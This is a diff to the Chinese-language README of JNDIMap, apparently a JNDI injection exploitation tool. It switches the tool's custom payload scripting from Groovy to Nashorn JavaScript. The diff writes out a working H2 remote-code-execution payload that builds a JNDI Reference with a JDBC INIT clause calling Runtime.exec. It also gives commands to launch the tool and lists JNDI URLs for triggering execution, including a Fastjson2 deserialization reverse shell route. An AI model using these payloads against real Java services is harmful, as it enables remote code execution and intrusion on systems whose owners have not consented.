@@ -15,7 +15,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI, LDAP 和 LDAPS 协议, �
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
 - LDAP(s) 反序列化
-- 自定义 JNDI Payload (基于 Groovy 语言)
+- 自定义 JNDI Payload (基于 Nashorn JS 引擎)
 
 ## Build
 
@@ -49,7 +49,7 @@ Usage: java -jar JNDIMap.jar [-i <ip>] [-r <rmiPort>] [-l <ldapPort>] [-s <ldaps
 
 `-u`: 手动指定 JNDI 路由, 例如 `/Basic/Command/open -a Calculator` (某些场景的 JNDI URL 并不完全可控)
 
-`-f`: Groovy 脚本路径, 用于编写自定义 JNDI Payload
+`-f`: JS 脚本路径, 用于编写自定义 JNDI Payload
 
 `-useReferenceOnly`: 仅适用于 LDAP 协议, 通过 LDAP 相关参数直接返回 Reference 对象, 用于绕过 `com.sun.jndi.ldap.object.trustSerialData`
 
@@ -392,44 +392,44 @@ ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
 
 ### Script
 
-JNDIMap 支持使用 [Groovy](https://groovy-lang.org/) 语言编写自定义 JNDI Payload 脚本
+JNDIMap 支持使用 Nashorn JavaScript 引擎 (基于 ES5) 编写自定义 JNDI Payload 脚本
 
 以 H2 RCE 为例
 
-```groovy
-import javax.naming.Reference
-import javax.naming.StringRefAddr
+```javascript
+var Reference = Java.type("javax.naming.Reference");
+var StringRefAddr = Java.type("javax.naming.StringRefAddr");
 
-def list = []
-list << "CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;return \"test\"\\;}'"
-list << "CALL EXEC('$args')" // 参数通过 args 变量传入
+var list = [];
+list.push("CREATE ALIAS EXEC AS 'String cmd_exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd);return \"test\";}'");
+list.push("CALL EXEC('" + args + "')"); // 参数通过 args 变量传入
 
-def url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=${list.join('\\;')}\\;"
+var url = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=" + list.join(";") + ";";
 
-def ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null)
-ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"))
-ref.add(new StringRefAddr("jdbcUrl", url))
+var ref = new Reference("javax.sql.DataSource", "com.zaxxer.hikari.HikariJNDIFactory", null);
+ref.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
+ref.add(new StringRefAddr("jdbcUrl", url));
 
-return ref // 返回 Reference 对象
+ref; // 返回 Reference 对象
 ```
 
 运行 JNDIMap
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy
+java -jar JNDIMap.jar -f /path/to/evil.js
 ```
 
 通过以下 JNDI URL 实现 RCE
 
 ```bash
-# 支持手动向 Groovy 脚本传入参数
+# 支持手动向 JS 脚本传入参数
 ldap://127.0.0.1:1389/Script/<args>
 ```
 
 如果在某些情况下, 无法完全控制 JNDI URL, 可以指定 `-u` 参数
 
 ```bash
-java -jar JNDIMap.jar -f /path/to/evil.groovy -u "/Script/open -a Calculator"
+java -jar JNDIMap.jar -f /path/to/evil.js -u "/Script/open -a Calculator"
 ```
 
 然后通过任意 JNDI URL 触发
